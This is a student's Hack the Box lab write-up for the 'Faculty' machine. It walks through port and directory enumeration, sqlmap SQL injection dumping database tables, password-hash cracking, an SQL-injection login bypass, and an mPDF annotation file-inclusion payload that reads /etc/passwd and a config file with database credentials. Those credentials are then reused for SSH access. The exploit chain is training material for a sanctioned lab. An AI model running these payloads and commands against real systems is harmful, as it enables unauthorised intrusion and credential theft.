---
author: [Felicitas Pojtinger]
date: "2022-10-12"
subject: "Hacking Report"
keywords: [hdm-stuttgart, hacking]
subtitle: "Hack the Box"
lang: en-US
---

# Uni Hacking Report (Faculty)

A pitfall: In nested VPN scenarios (Mullvad 1 → Mullvad 2 → HTB), use OpenVPN TCP in both Mullvad 2 and HTB - otherwise random things (like the PDF downloads and SSH access) don't work!

**Machine**: Faculty (10.10.11.169)

```shell
$ nmap -v -p- 10.10.11.169
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 14:39 CEST
Initiating Ping Scan at 14:39
Scanning 10.10.11.169 [2 ports]
Completed Ping Scan at 14:39, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:39
Completed Parallel DNS resolution of 1 host. at 14:39, 0.02s elapsed
Initiating Connect Scan at 14:39
Scanning 10.10.11.169 [65535 ports]
Discovered open port 80/tcp on 10.10.11.169
Discovered open port 22/tcp on 10.10.11.169
```

```shell
# /etc/hosts
faculty.htb 10.10.11.169
```

```shell
$ ffuf -w ~/Downloads/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://10.10.11.169/ -H 'Host: FUZZ.faculty.htb' -fs 0,154
# No results

$ ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.htb/FUZZ -fs 12193
admin
```

```shell
$ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=login_faculty' --data="id_no=asdf" --method POST --dbs --batch -time-sec=1

$ cat /home/pojntfx/.local/share/sqlmap/output/faculty.htb/log
# ...
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0, PHP
back-end DBMS: MySQL >= 5.0.12
available databases [2]:
[*] information_schema
[*] scheduling_db
```

```shell
$ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=login_faculty' --data="id_no=asdf" --method POST --dbs --batch -time-sec=1 --columns --threads 10
# ...
[15:20:52] [INFO] resumed: class_schedule_info
[15:20:52] [INFO] resumed: courses
[15:20:52] [INFO] resumed: faculty
[15:20:52] [INFO] resumed: schedules
[15:20:52] [INFO] resumed: subjects
[15:20:52] [INFO] resumed: users
[15:20:52] [INFO] fetching columns for table 'schedules' in database 'scheduling_db'
[15:20:52] [INFO] resumed: 12
[15:20:52] [INFO] resuming partial value: date
[15:20:52] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[15:20:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
_created
[15:21:19] [INFO] retrieved: datetime
[15:21:44] [INFO] retrieved: description
# ...

$ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=login_faculty' --data="id_no=asdf" --method POST --dbs --batch -time-sec=1 --dump -T users -D scheduling_db

$ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=login_faculty' --data="id_no=asdf" --method POST --dbs --batch -time-sec=1 --dump -T users -D scheduling_db -C name,password
# ...
[15:34:31] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
Administrator
[15:35:15] [INFO] retrieved: 1fecbe762af147c1176a0
15:37:12] [WARNING] no clear password(s) found
Database: scheduling_db
Table: users
[1 entry]
+---------------+----------------------------------+
| name          | password                         |
+---------------+----------------------------------+
| Administrator | 1fecbe762af147c1176a0fc2c722a345 |
+---------------+----------------------------------+
###
```

```shell
$ echo '1fecbe762af147c1176a0fc2c722a345' | tee /tmp/hash
$ hashcat -m 0 -a 0 /tmp/hash ~/Downloads/rockyou.txt
# Approaching final keyspace - workload adjusted.
```

```shell
$ john --wordlist ~/Downloads/rockyou.txt /tmp/hash
g 0:00:00:00 DONE (2022-10-12 15:47) 0g/s 19677p/s 19677c/s 7923MC/s 123456..sss
Session completed
```

```shell
$ john --fork=$(nproc) --wordlist ~/Downloads/rockyou.txt /tmp/hash
```

```shell
$ curl -Lo https://download.weakpass.com/wordlists/1927/cyclone.hashesorg.hashkiller.combined.txt.7z
$ hashcat -w 4 -a 0 /tmp/hash ~/Downloads/cyclone.hashesorg.hashkiller.combined.txt
```

```shell
$ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=login_faculty' --data="id_no=asdf" --method POST --dbs --batch -time-sec=1 --dump -T faculty -D scheduling_db
# ...
[18:57:01] [INFO] retrieved: firstname
[18:57:36] [INFO] retrieved: gender
[18:58:00] [INFO] retrieved: id
[18:58:08] [INFO] retrieved: id_no
# ...

$ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=login_faculty' --data="id_no=asdf" --method POST --dbs --batch -time-sec=1 --dump -T faculty -D scheduling_db -C id_no
# ...
Database: scheduling_db
Table: faculty
[3 entries]
+----------+
| id_no    |
+----------+
| 30903070 |
| 63033226 |
| 85662050 |
+----------+
```

Now we can login using these credentials.

```shell
$ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=get_schecdule' --data="faculty_id=3" --method POST --dbs --batch -time-sec=1 --column
# ...
Database: scheduling_db
Table: courses
[3 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| course      | varchar(200) |
| description | text         |
| id          | int          |
+-------------+--------------+

Database: scheduling_db
Table: users
[5 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int          |
| name     | text         |
| password | text         |
| type     | tinyint(1)   |
| username | varchar(200) |
+----------+--------------+

Database: scheduling_db
Table: class_schedule_info
[4 columns]
+-------------+------+
| Column      | Type |
+-------------+------+
| course_id   | int  |
| id          | int  |
| schedule_id | int  |
| subject     | int  |
+-------------+------+

Database: scheduling_db
Table: faculty
[9 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| address    | text         |
| contact    | varchar(100) |
| email      | varchar(200) |
| firstname  | varchar(100) |
| gender     | varchar(100) |
| id         | int          |
| id_no      | varchar(100) |
| lastname   | varchar(100) |
| middlename | varchar(100) |
+------------+--------------+

Database: scheduling_db
Table: subjects
[3 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| description | text         |
| id          | int          |
| subject     | varchar(200) |
+-------------+--------------+

Database: scheduling_db
Table: schedules
[12 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| date_created   | datetime     |
| description    | text         |
| faculty_id     | int          |
| id             | int          |
| is_repeating   | tinyint(1)   |
| location       | text         |
| repeating_data | text         |
| schedule_date  | date         |
| schedule_type  | tinyint(1)   |
| time_from      | time         |
| time_to        | time         |
| title          | varchar(200) |
+----------------+--------------+
# ...
```

```shell
$ sqlmap -u 'http://faculty.htb/admin/ajax.php?action=get_schecdule' --data="faculty_id=3" --method POST --dbs --batch -time-sec=1 --privileges
# ...
privilege: USAGE
```

Login to http://faculty.htb/admin with username `' OR 1=1#`.

PDF gets POSTed; base64 decode, unescape and prettify:

```plaintext
$ function urldecode() { : "${*//+/ }"; echo -e "${_//%/\\x}"; }
$ urldecode $(urldecode $(echo 'JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VGYWN1bHRpZXMlMjUzQyUyNTJGaDIlMjUzRSUyNTNDdGFibGUlMjUzRSUyNTA5JTI1M0N0aGVhZCUyNTNFJTI1MDklMjUwOSUyNTNDdHIlMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VJRCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRU5hbWUlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VFbWFpbCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRUNvbnRhY3QlMjUzQyUyNTJGdGglMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0MlMjUyRnRoZWFkJTI1M0UlMjUzQ3Rib2R5JTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1N0IlMjU3QjclMjUyQTclMjU3RCUyNTdEJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0UlMjU3QiUyNTdCNyUyNTJBNyUyNTdEJTI1N0QlMjUyQyUyQiUyNTdCJTI1N0I3JTI1MkE3JTI1N0QlMjU3RCUyQiUyNTdCJTI1N0I3JTI1MkE3JTI1N0QlMjU3RCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRSUyNTdCJTI1N0I3JTI1MkE3JTI1N0QlMjU3RCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTJCJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFJTI1N0IlMjU3QjclMjUyQTclMjU3RCUyNTdEJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UxJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0UlMjU3QiUyNTdCNyUyNTJBNyUyNTdEJTI1N0QlMjUyQyUyQiUyNTdCJTI1N0I3JTI1MkE3JTI1N0QlMjU3RCUyQiUyNTdCJTI1N0I3JTI1MkE3JTI1N0QlMjU3RCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRSUyNTdCJTI1N0I3JTI1MkE3JTI1N0QlMjU3RCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTJCJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFJTI1N0IlMjU3QjclMjUyQTclMjU3RCUyNTdEJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0U4NTY2MjA1MCUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFQmxha2UlMjUyQyUyQkNsYWlyZSUyQkclMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VjYmxha2UlMjU0MGZhY3VsdHkuaHRiJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMkIlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0UlMjUyODc2MyUyNTI5JTJCNDUwLTAxMjElMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnNtYWxsJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0N0ciUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRTMwOTAzMDcwJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VKYW1lcyUyNTJDJTJCRXJpYyUyQlAlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VlamFtZXMlMjU0MGZhY3VsdHkuaHRiJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMkIlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0UlMjUyODcwMiUyNTI5JTJCMzY4LTM2ODklMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnNtYWxsJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0N0ciUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRTEyMzQ1Njc4JTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VURVNUJTI1MkMlMkJURVNUJTJCVEVTVCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRVRFU1QlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnNtYWxsJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyQiUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRVRFU1QlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnNtYWxsJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0MlMjUyRnRib2J5JTI1M0UlMjUzQyUyNTJGdGFibGUlMjUzRQ==' | base64 -d))
```

We get the following result:

```html
<h1><a name="top"></a>faculty.htb</h1>
<h2>Faculties</h2>
<table>
  <thead>
    <tr>
      <th class="text-center">ID</th>
      <th class="text-center">Name</th>
      <th class="text-center">Email</th>
      <th class="text-center">Contact</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td class="text-center">{{7*7}}</td>
      <td class="text-center"><b>{{7*7}}, {{7*7}} {{7*7}}</b></td>
      <td class="text-center">
        <small><b>{{7*7}}</b></small>
      </td>
      <td class="text-center">
        <small><b>{{7*7}}</b></small>
      </td>
    </tr>
    <tr>
      <td class="text-center">1</td>
      <td class="text-center"><b>{{7*7}}, {{7*7}} {{7*7}}</b></td>
      <td class="text-center">
        <small><b>{{7*7}}</b></small>
      </td>
      <td class="text-center">
        <small><b>{{7*7}}</b></small>
      </td>
    </tr>
    <tr>
      <td class="text-center">85662050</td>
      <td class="text-center"><b>Blake, Claire G</b></td>
      <td class="text-center">
        <small><b>cblake@faculty.htb</b></small>
      </td>
      <td class="text-center">
        <small><b>(763) 450-0121</b></small>
      </td>
    </tr>
    <tr>
      <td class="text-center">30903070</td>
      <td class="text-center"><b>James, Eric P</b></td>
      <td class="text-center">
        <small><b>ejames@faculty.htb</b></small>
      </td>
      <td class="text-center">
        <small><b>(702) 368-3689</b></small>
      </td>
    </tr>
    <tr>
      <td class="text-center">12345678</td>
      <td class="text-center"><b>TEST, TEST TEST</b></td>
      <td class="text-center">
        <small><b>TEST</b></small>
      </td>
      <td class="text-center">
        <small><b>TEST</b></small>
      </td>
    </tr>
  </tbody>
</table>
```

We can POST to this endpoint using cURL:

```shell
$ curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3' -H 'Origin: http://faculty.htb' -H 'Referer: http://faculty.htb/admin/index.php?page=faculty' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' -H 'X-Requested-With: XMLHttpRequest' --data-raw 'pdf=JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VGYWN1bHRpZXMlMjUzQyUyNTJGaDIlMjUzRSUyNTNDdGFibGUlMjUzRSUyNTA5JTI1M0N0aGVhZCUyNTNFJTI1MDklMjUwOSUyNTNDdHIlMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VJRCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRU5hbWUlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VFbWFpbCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRUNvbnRhY3QlMjUzQyUyNTJGdGglMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0MlMjUyRnRoZWFkJTI1M0UlMjUzQ3Rib2R5JTI1M0UlMjUzQyUyNTJGdGJvYnklMjUzRSUyNTNDJTI1MkZ0YWJsZSUyNTNF' --compressed -L -vvv
```

For example, to get a PDF with "Hello, world!" in it:

```shell
cat <<EOT | jq -sRr @uri | base64 -w 0 > /tmp/body
<h1>Hello, world!</h1>
EOT
export ID=$(curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3' -H 'Origin: http://faculty.htb' -H 'Referer: http://faculty.htb/admin/index.php?page=faculty' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' -H 'X-Requested-With: XMLHttpRequest' --data-raw pdf=$(cat /tmp/body))
```

This returns the ID, so we can the full path like so (the `mpdf/tmp/` path can be found when downloading it from the browser):

```shell
$ xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
```

This returns a PDF with the text "Hello, world!". MPDF has a file inclusion exploit ([https://www.exploit-db.com/exploits/50995](https://www.exploit-db.com/exploits/50995)), so let's try to get `/etc/passwd`:

```shell
cat <<EOT | jq -sRr @uri | base64 -w 0 > /tmp/body
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
EOT
export ID=$(curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3' -H 'Origin: http://faculty.htb' -H 'Referer: http://faculty.htb/admin/index.php?page=faculty' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' -H 'X-Requested-With: XMLHttpRequest' --data-raw pdf=$(cat /tmp/body))
xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
```

Opening the PDF in Atril shows the following attached file:

```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

`gbyolo`, `developer` and `root` are our next targets.

We can't find anything suspicious directly, so lets fetch the application source code to the host:

```shell
$ ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u http://faculty.htb/FUZZ -fs 12193
# ...
admin                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 22ms]
mpdf                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 24ms]
# ...
```

Our first guess fails:

```shell
export FILE='/var/www/admin.php'
cat <<EOT | jq -sRr @uri | base64 -w 0 > /tmp/body
<annotation file="${FILE}" content="${FILE}" icon="Graph" title="Attached File: ${FILE}" pos-x="195" />
EOT
export ID=$(curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3' -H 'Origin: http://faculty.htb' -H 'Referer: http://faculty.htb/admin/index.php?page=faculty' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' -H 'X-Requested-With: XMLHttpRequest' --data-raw pdf=$(cat /tmp/body))
xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
```

Lets see if we can get a stacktrace to help us find the source code location:

```shell
curl 'http://faculty.htb/admin/ajax.php?action=login'   -H 'Accept: */*'   -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8'   -H 'Connection: keep-alive'   -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3'   -H 'Origin: http://faculty.htb'   -H 'Referer: http://faculty.htb/admin/login.php'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'   -H 'X-Requested-With: XMLHttpRequest'   --data-raw 'idonotexist='   --compressed   --insecure
<br />
<b>Notice</b>:  Undefined variable: username in <b>/var/www/scheduling/admin/admin_class.php</b> on line <b>21</b><br />
<br />
<b>Notice</b>:  Undefined variable: password in <b>/var/www/scheduling/admin/admin_class.php</b> on line <b>21</b><br />
```

And fetch the file:

```shell
export FILE='/var/www/scheduling/admin/admin_class.php'
cat <<EOT | jq -sRr @uri | base64 -w 0 > /tmp/body
<annotation file="${FILE}" content="${FILE}" icon="Graph" title="Attached File: ${FILE}" pos-x="195" />
EOT
export ID=$(curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3' -H 'Origin: http://faculty.htb' -H 'Referer: http://faculty.htb/admin/index.php?page=faculty' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' -H 'X-Requested-With: XMLHttpRequest' --data-raw pdf=$(cat /tmp/body))
xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
```

It returns in the attachment:

```php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
	private $db;

	public function __construct() {
		ob_start();
   	include 'db_connect.php';

    $this->db = $conn;
	}
	function __destruct() {
	    $this->db->close();
	    ob_end_flush();
	}

	# ...
```

Let's look at `db_connect.php` to see if we can find the DB credentials:

```shell
export FILE='/var/www/scheduling/admin/db_connect.php'
cat <<EOT | jq -sRr @uri | base64 -w 0 > /tmp/body
<annotation file="${FILE}" content="${FILE}" icon="Graph" title="Attached File: ${FILE}" pos-x="195" />
EOT
export ID=$(curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3' -H 'Origin: http://faculty.htb' -H 'Referer: http://faculty.htb/admin/index.php?page=faculty' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' -H 'X-Requested-With: XMLHttpRequest' --data-raw pdf=$(cat /tmp/body))
xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
```

It returns:

```shell
<?php

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

The constructor looks like this (see https://www.php.net/manual/en/mysqli.construct.php):

```php
public mysqli::__construct(
    string $hostname = ini_get("mysqli.default_host"),
    string $username = ini_get("mysqli.default_user"),
    string $password = ini_get("mysqli.default_pw"),
    string $database = "",
    int $port = ini_get("mysqli.default_port"),
    string $socket = ini_get("mysqli.default_socket")
)
```

So the user is `sched` and the password is `Co.met06aci.dly53ro.per`. Let see if the password matches for any of `gbyolo`, `developer` and `root` (`sched` isn't in `/etc/passwd`). And we're in!

```shell
$ ssh gbyolo@10.10.11.169
gbyolo@10.10.11.169's password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct 13 20:36:01 CEST 2022

  System load:           0.01
  Usage of /:            82.5% of 4.67GB
  Memory usage:          44%
  Swap usage:            0%
  Processes:             229
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.169
  IPv6 address for eth0: dead:beef::250:56ff:feb9:63db


0 updates can be applied immediately.


